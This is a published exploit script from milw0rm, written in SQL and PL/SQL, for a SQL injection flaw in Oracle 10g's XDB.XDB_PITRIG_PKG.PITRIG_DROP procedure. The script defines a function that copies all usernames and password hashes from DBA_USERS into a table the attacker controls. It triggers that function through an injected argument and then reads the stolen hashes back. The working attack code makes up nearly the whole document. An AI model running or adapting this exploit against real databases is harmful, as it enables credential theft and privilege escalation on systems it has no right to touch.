/******************************************************************/
/******* Oracle 10g R1 xDb.XDB_PITRIG_PKG.PITRIG_DROP    **********/
/*******                SQL Injection Exploit            **********/
/******************************************************************/
/************     sploit get password Hashes        ***************/
/******************************************************************/
/******************  BY Sh2kerr (Digital Security)  ***************/
/******************************************************************/
/***************** tested on oracle 10.1.0.2.0  *******************/
/******************************************************************/
/******************************************************************/
/*         Date of Public EXPLOIT:  January 28, 2008              */
/*         Written by:              Alexandr "Sh2kerr" Polyakov   */
/*         email:                   Alexandr.Polyakov@dsec.ru     */
/*         site:                    http://www.dsec.ru            */
/******************************************************************/
/*  Original Advisory by:                                         */
/*      Alexandr Polyakov [ Alexandr.Polyakov@dsec.ru]            */
/*      Reported: 18  Dec 2007                                    */
/*      Date of Public Advisory: January 15, 2008                 */
/*      Advisory: http://www.oracle.com/technology/deploy/        */
/*                security/critical-patch-updates/cpujan2008.html */
/*                                                                */
/******************************************************************/


CREATE TABLE SH2KERR(id NUMBER,name VARCHAR(20),password VARCHAR(16));

CREATE OR REPLACE FUNCTION SHOWPASS return varchar2
authid current_user as
pragma autonomous_transaction;
BEGIN
EXECUTE IMMEDIATE 'INSERT INTO SCOTT.sh2kerr(id,name,password) SELECT user_id,username,password FROM DBA_USERS';
COMMIT;
RETURN '';
END;
/


EXEC XDB.XDB_PITRIG_PKG.PITRIG_DROP('SCOTT"."SH2KERR" WHERE 1=SCOTT.SHOWPASS()--','HELLO IDS IT IS EXPLOIT :)');

select * from sh2kerr;




/******************************************************************/
/*************************** SEE U LATER  ;)  ***********************/
/******************************************************************/

// milw0rm.com [2008-01-28]
